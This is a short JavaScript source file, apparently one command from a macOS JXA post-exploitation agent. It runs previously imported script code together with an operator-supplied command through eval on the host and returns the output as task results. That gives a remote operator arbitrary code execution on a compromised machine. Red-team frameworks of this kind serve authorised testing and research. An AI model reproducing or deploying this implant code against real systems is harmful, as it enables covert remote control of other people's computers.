exports.jsimport_call = function(task, command, params){
    try{
        let command_params = JSON.parse(params);
        if(!command_params.hasOwnProperty('command')){ return {"user_output": "missing command parameter", "status": "error", "completed": true};}
        let output = ObjC.deepUnwrap(eval(jsimport + "\n " + command_params['command']));
        if(output === "" || output === undefined){
            return {"user_output":"No command output", "completed": true};
        }
        if(output === true){
            return {"user_output":"True", "completed": true};
        }
        if(output === false){
            return{"user_output":"False", "completed": true};
        }
        if(typeof(output) != "string"){
            output = String(output);
        }
        return {"user_output":output, "completed": true};
    }
    catch(error){
        return {"user_output":error.toString(), "completed": true, "status": "error"};
    }
};
